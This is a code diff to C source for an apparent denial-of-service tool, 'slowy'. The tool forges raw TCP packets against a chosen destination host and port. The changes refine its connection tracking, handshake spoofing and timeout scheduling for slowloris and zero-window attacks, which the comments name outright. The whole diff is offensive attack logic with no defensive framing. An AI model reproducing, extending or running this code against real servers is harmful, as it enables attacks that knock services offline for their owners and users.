@@ -43,13 +43,14 @@ typedef struct _tag_TCPCON {
   int         sport;
   int         mss;
 
-  double      timeout; /* time to wait before sending (0 = send nothing) */
-  int         window;  /* current win size                               */
+  double      timestamp; /* packet timestamp (0 = no packet) */
+  double      timeout;
+  int         window;    /* current win size                 */
   unsigned    flags;
-  unsigned    seq;     /* seq                                            */
-  unsigned    ack;     /* last acked bytes                               */
-  int         offset;  /* current offset                                 */
-  int         tosend;  /* next bytes to sent                             */
+  unsigned    seq;       /* seq                              */
+  unsigned    ack;       /* last acked bytes                 */
+  int         offset;    /* current offset                   */
+  int         tosend;    /* next bytes to sent               */
   struct _tag_TCPCON *next;
 } TCP_CON;
 
@@ -58,7 +59,8 @@ typedef struct _tag_SLOWY_CFG {
   INET_ADDR   dhost;
   int         mss;
   int         zerowin;
-  double      timeout;
+  double      ltimeout; /* lost-packet timeout */
+  double      ntimeout; /* next-packet timeout */
   char       *payload;
   unsigned    payload_size;
   TCP_CON    *conns[256];
@@ -177,35 +179,41 @@ static void slowy__listen(THREAD_WORK *tw)
             TCP_HEADER(m->b)->rst,
             IP_HEADER(m->b)->saddr, tc->shost.addr.in.addr);
 
+    c = conn_get(tw, TCP_HEADER(m->b)->dest);
+    if(c)
+      TDBG2("  # (%d) continuing connection", c->sport);
+
     /* in some special case (handshake) send kakita */
     if(TCP_HEADER(m->b)->syn != 0
-    && TCP_HEADER(m->b)->ack != 0)
+    && TCP_HEADER(m->b)->ack != 0
+    && !c)
     {
-      TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
       /* register connection */
       c = conn_new(tw, TCP_HEADER(m->b)->dest);
+      TDBG2("  # opening connection (%d - %p)", TCP_HEADER(m->b)->dest, c);
 
       /* get mss */
       c->mss = ln_tcp_get_mss(m->b, m->s);
-
-      /* send handshake */
-      ln_send_tcp_packet(tc->lnc,
-                         &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
-                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                         TH_ACK,
-                         ntohs(TCP_HEADER(m->b)->window),
-                         ntohl(TCP_HEADER(m->b)->ack_seq),
-                         ntohl(TCP_HEADER(m->b)->seq) + 1,
-                         NULL, 0,
-                         NULL, 0);
+      TDBG2("  # (%d) mss = %d", c->sport, c->mss);
 
       /* prepare first request packet to schedule (common for both attacks) */
       c->offset  = 0;
       c->seq     = TCP_HEADER(m->b)->ack_seq;
       c->ack     = TCP_HEADER(m->b)->seq + 1;
       c->flags   = TH_ACK;
-    } else
-      c = conn_get(tw, TCP_HEADER(m->b)->dest);
+
+      /* send handshake */
+      TDBG2("  # (%d) sending handshake", c->sport);
+      ln_send_tcp_packet(tc->lnc,
+                         &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
+                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                         c->flags,
+                         ntohs(c->window),
+                         ntohl(c->seq),
+                         ntohl(c->ack),
+                         NULL, 0,
+                         NULL, 0);
+    }
 
     if(!c)
     {
@@ -231,18 +239,19 @@ static void slowy__listen(THREAD_WORK *tw)
       }
 
       /* decide other parameters (depending on attack) */
-      c->timeout = pthreadex_time_get();
+      c->timestamp = pthreadex_time_get();
+      c->timeout   = 0.0;
       if(tc->zerowin)
       {
         /* (zerowin) */
         s = m->s - (TCP_HEADER(m)->doff << 2) - (IP_HEADER(m)->ihl << 2);
-        c->window  = c->window > s ? c->window - s : 0;
+        c->window = c->window > s ? c->window - s : 0;
         if(c->window == 0)
-          c->timeout += tc->timeout;
+          c->timeout = tc->ntimeout;
       } else {
         /* (slowloris) */
         if(c->tosend > 0)
-          c->timeout += tc->timeout;
+          c->timeout = tc->ntimeout;
       }
     } else
     if(TCP_HEADER(m->b)->fin != 0
@@ -335,21 +344,21 @@ static int slowy__configure(THREAD_WORK *tw, SNODE *command)
     switch(cn->type)
     {
       case TYPE_OPT_SRC:
-        s = tea_get_string(cn->option.addr);
+        s = tea_snode_get_string(cn->option.addr);
         if(ip_addr_parse(s, &tc->shost))
           TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
         free(s);
         if(cn->option.port)
-          ip_addr_set_port(&tc->shost, tea_get_int(cn->option.port));
+          ip_addr_set_port(&tc->shost, tea_snode_get_int(cn->option.port));
         break;
 
       case TYPE_OPT_DST:
-        s = tea_get_string(cn->option.addr);
+        s = tea_snode_get_string(cn->option.addr);
         if(ip_addr_parse(s, &tc->dhost))
           TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
         free(s);
         if(cn->option.port)
-          ip_addr_set_port(&tc->dhost, tea_get_int(cn->option.port));
+          ip_addr_set_port(&tc->dhost, tea_snode_get_int(cn->option.port));
         break;
 
       case TYPE_OPT_PAYLOAD_FILE:
